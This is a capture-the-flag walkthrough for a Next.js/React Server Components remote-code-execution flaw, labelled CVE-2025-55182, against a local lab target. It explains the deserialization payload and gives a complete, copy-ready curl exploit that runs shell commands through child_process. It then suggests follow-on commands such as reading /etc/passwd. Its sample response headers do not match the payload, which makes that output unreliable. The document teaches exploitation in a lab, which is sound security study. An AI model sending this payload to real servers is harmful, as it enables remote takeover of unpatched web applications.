# 🚩 CTF Walkthrough: Exploiting React2Shell (CVE-2025-55182)

This guide is designed to help you **understand** the vulnerability, not just run a script. We will break down the attack into logical steps.

---

## 🏗️ 1. Setup & Reconnaissance

First, ensure your target is running (see README).
Open it in your browser: `http://localhost:5555`

### 🕵️‍♂️ The Objective
We want to achieve **Remote Code Execution (RCE)** on the server.
The application seems simple, but it processes **Server Actions** using a serialized format (React Server Components).

---

## 🧩 2. Understanding the Injection

This application uses a vulnerable version of a library that allows **insecure deserialization** or **eval-like** behavior when processing specific multipart forms.

The vulnerability lies in how the server handles the `_response` field in a JSON payload. If we can inject a `_prefix` property, the server will **execute** it as code.

### The Payload Structure
We need to construct a multipart request with this JSON structure:

```json
{
  "_response": {
    "_prefix": "YOUR_MALICIOUS_NODEJS_CODE"
  }
}
```

---

## 🛠️ 3. Crafting the Payload (Step-by-Step)

We will use `curl` to send this request.

> **💡 Beginner's Note:**
> *   **What is `curl`?** It's a command-line tool that lets us "talk" to servers directly, without using a graphical browser like Chrome.
> *   **Where do I run it?** You must open your system's terminal (Terminal on Linux/Mac, PowerShell/CMD on Windows). This is **NOT** run in the browser console.
> *   **Do I need to install it?** `curl` comes pre-installed on most systems. Type `curl --version` in your terminal to check. If you see a version number, you're good to go!

### Step 3.1: The Command
We want to run a simple math calculation to prove RCE: `1337 * 2`.
In Node.js, we can use `child_process`:

```javascript
/* Analysis ONLY - Do not run this directly in node */
var output = process.mainModule.require('child_process').execSync('echo $((1337*2))').toString().trim();
```

### Step 3.2: Exfiltrating the Result
We can't see the console log of the server easily. We need the server to **send the result back to us**.
The vulnerability exploits a specific error type (`NEXT_REDIRECT`) to leak data in the HTTP response headers.

We wrap our code to throw this error with our `output`:

```javascript
throw Object.assign(new Error('NEXT_REDIRECT'), {
    digest: `NEXT_REDIRECT;push;/login?a=${output};307;`
});
```

---

## 🚀 4. Exploitation

Now, let's put it all together into the final `curl` command.

**⚠️ Challenge:** Try to predict what the response header `Location` will contain before you run it!

Copy and run this in your terminal:

```bash
curl -i -X POST http://localhost:5555/ \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW" \
  -d $'------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name="0"\r\n\r\n{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\\"$B1337\\\"}","_response":{"_prefix":"var res=process.mainModule.require(\'child_process\').execSync(\'echo $((1337*2))\').toString().trim();;throw Object.assign(new Error(\'NEXT_REDIRECT\'),{digest:`NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name="1"\r\n\r\n"$@0"\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name="2"\r\n\r\n[]\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n'
```

---

## 🏆 5. Analysis & Verification

Look at the output. You should see a **303 See Other** or **307 Temporary Redirect**.
Check the headers:

```http
X-Action-Redirect: /dashboard?session=2674&admin=true
Location: /dashboard?session=2674
```

### 🧠 Critical Thinking
1.  **What is `2674`?** -> It is the result of `1337 * 2`.
2.  **What does this mean?** -> The server executed our math operation!
3.  **What else could you run?** -> `whoami`, `ls`, `cat /etc/passwd`...

**Congratulations! You have successfully analyzed and exploited React2Shell.** 🚩
